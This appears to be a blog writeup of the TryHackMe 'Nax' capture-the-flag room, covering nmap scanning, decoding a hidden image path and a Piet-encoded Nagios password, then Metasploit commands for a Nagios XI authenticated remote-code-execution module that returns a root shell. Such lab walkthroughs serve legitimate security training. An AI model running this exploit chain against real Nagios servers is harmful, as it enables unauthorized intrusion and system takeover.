---
layout: post
title: THM Nax writeup
date: 2022-06-18T19:22:24.527Z
---
After lunching the vm i started doing some enumeration, port scanning and fuzzing

```
# Nmap 7.80 scan initiated Sun Jun 19 16:46:08 2022 as: nmap -sC -sV -oN nmap/results -v nax.thm
Nmap scan report for nax.thm (10.10.55.121)
Host is up (0.37s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (ED25519)
25/tcp  open  smtp    Postfix smtpd
|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Issuer: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| tls-alpn: 
|_  http/1.1
```

i found 5 ports open, but the only interesting one here is port 80 which is the webserver, i also did some fuzzing with gobuster but it didn't find actually something useful and so i looked at the website itself

![](/src/images/uploads/9s.png)

nothing interesting except those periodic table elements where if you get the atomic values of each element you will get this

```
47 80 73 51 84 46 80 78 103
```

which looks like ascii values and by using an online converter from ascii to text you will get `/PI3T.PNg` which is the answer for the sercret file 

by opening that image you will get this 

![](/src/images/uploads/9d.png)

download that image and check its exif data 

```
exiftool PI3T.PNg
```

and here you will find the owner of the image

looking at the image it looks like piet programming language which decoded can show probably interesting information

i installed [npiet](https://www.bertnase.de/npiet/) and then ran 

```
./npiet PI3T.ppm -e 1000
```

which gives `nagiosadmin%n3p3UQ&9BjLp4$7uhWdY` probably user and password

after doing a small reserach i found this interesting [exploit](https://www.exploit-db.com/exploits/48191) which requires user and password that we have, then start metasploit

```
msfconsole
```

```
Msf6> use exploit/linux/http/nagios_xi_authenticated_rce
Msf6> options
Msf6> set PASSWORD n3p3UQ&9BjLp4$7uhWdY
Msf6> set USERNAME nagiosadmin
Msf6> set RHOSTS nax.thm
Msf6> set LHOSTS YOUR_IP
Msf6> run
```

and after running the exploit you will get a root shell where you can get both the flags